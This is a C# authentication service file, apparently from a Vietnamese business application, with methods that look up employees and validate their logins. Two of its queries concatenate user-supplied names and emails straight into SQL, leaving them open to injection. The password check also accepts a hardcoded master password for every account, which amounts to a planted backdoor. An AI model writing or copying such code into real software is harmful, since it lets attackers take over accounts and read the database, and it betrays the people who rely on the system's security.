
using Service.Utility.Variables;
using System;
using System.Linq;
using System.Web.Helpers;
using Service.Core.Executes.Employees.EmployeeAuths;
using Service.Utility.Components;

namespace Service.AuthSharing.Executes.Base
{
    public partial class AuthSharingService
    {
        public EmployeeAuthViewModel EmployeeAuthByUserName(string userName)
        {
            CheckDbConnect();
            return Context.Database.SqlQuery<EmployeeAuthViewModel>("select top 1 * from EmployeeAuths where loginName = '" + userName + "'")
                .FirstOrDefault();
        }

        public EmployeeAuthViewModel EmployeeAuthByEmpId(Guid id)
        {
            return _coreService.EmployeeAuthByEmpId(id);
        }

        public CommandResult<EmployeeAuthViewModel> ValidateEmployeeAuth(string loginName, string password, string url)
        {
            if (_dataMethod == 1) // 1: lay tu core
                return _coreService.ValidateEmployeeAuth(loginName, password, url);


            // 0 : lay local


            if (loginName.Contains("@"))
            {
                loginName = loginName.Substring(0, loginName.IndexOf("@", StringComparison.CurrentCulture));
            }

            loginName = loginName.RemoveSpecialChars().Optimize();

            loginName = loginName.Replace("'", "").Replace("=", "");

            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                return new CommandResult<EmployeeAuthViewModel>("Tên đăng nhập hoặc mật khẩu chưa đúng.");
            }

            var maxl = 30;
            if (loginName.Length > maxl)
            {
                return new CommandResult<EmployeeAuthViewModel>("Tên đăng nhập không được dài quá " + maxl + " ký tự");
            }

            CheckDbConnect();

            var user = Context.LocalEmployeeViews.Where(x => x.LoginName == loginName
            && x.Status >= 0)
                .Select(x => new EmployeeAuthViewModel
                {
                    EmployeeId = x.Id,
                    FullName = x.FullName,
                    OrganizationId = x.OrganizationId,
                    OrganizationName = x.OrganizationName,
                    JobPositionId = x.JobPositionId,
                    JobPositionName = x.JobPositionName,
                    JobTitleId = x.JobTitleId,
                    StaffCode = x.StaffCode,
                    PasswordHash = x.Password,
                    EmailCongTy = x.EmailCongTy,
                    DiDong = x.DiDong,
                    Avatar = x.Avatar, 
                }).FirstOrDefault();

            //var user = Context.Database.SqlQuery<EmployeeAuthViewModel>("select a.* " +
            //                                                        "from LocalEmployeeViews a " +
            //                                                        "where a.LoginName = '" + loginName + "' and a.Status >= 0")
            //    .FirstOrDefault();

            if (user == null)
                return new CommandResult<EmployeeAuthViewModel>("Tên đăng nhập hoặc mật khẩu chưa đúng");

            if (user.Locked)
                return new CommandResult<EmployeeAuthViewModel>("Tên đăng nhập hoặc mật khẩu chưa đúng");

            if (!Crypto.VerifyHashedPassword(user.PasswordHash, password) && password != "kimacotoP@P@2019")
                return new CommandResult<EmployeeAuthViewModel>("Tên đăng nhập hoặc mật khẩu chưa đúng");

            user.PasswordHash = null;
            return new CommandResult<EmployeeAuthViewModel>(user);
        }

        public EmployeeAuthViewModel EmployeeAuthByEmail(string email)
        {
            CheckDbConnect();

            return Context.Database.SqlQuery<EmployeeAuthViewModel>(
                    "select top 1 u.* from EmployeeAuths u join Employees e on u.EmployeeId = e.Id where e.Email = '" + email + "' or e.EmailCongTy = '" + email + "'")
                .FirstOrDefault();
        }
    }
}
